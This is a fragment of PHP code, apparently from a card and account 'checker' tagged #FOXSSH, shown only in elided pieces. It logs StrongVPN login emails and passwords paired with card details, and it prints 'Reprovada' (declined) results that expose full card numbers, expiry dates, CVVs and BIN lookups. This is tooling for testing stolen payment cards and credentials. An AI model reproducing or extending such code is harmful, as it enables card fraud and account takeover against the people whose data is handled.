...
$linhaAcesso = "Login StrongVPN => $emailAcesso | $senhaAcesso [ $Brand - Card: $last4 ] #FOXSSH<br>";
...
fclose($myfile);
  ...
  echo "<font size=2><label class='badge badge-danger'>Reprovada ✘</label> $cc $mes/$ano $cvv [ $resultbin ] #FOXSSH( $data )</font><br>";exit;
}

}else{
  echo "<font size=2><label class='badge badge-danger'>Reprovada ✘</label> $cc $mes/$ano $cvv [ $resultbin ] #FOXSSH( Cartão inválido )</font><br>";exit;
}